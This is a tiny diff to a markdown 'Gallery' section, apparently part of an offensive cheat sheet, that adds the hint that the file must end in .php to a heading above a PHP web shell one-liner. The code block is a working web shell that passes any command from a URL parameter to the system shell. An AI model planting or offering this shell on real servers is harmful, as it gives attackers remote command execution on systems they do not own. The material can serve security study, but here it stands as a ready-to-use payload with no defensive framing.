@@ -1,5 +1,5 @@
 ## Gallery
-web shell oneliner
+web shell oneliner (must end w/ .php)
 ```php
 $ <?php echo system($_GET["cmd"]); ?>
 ```
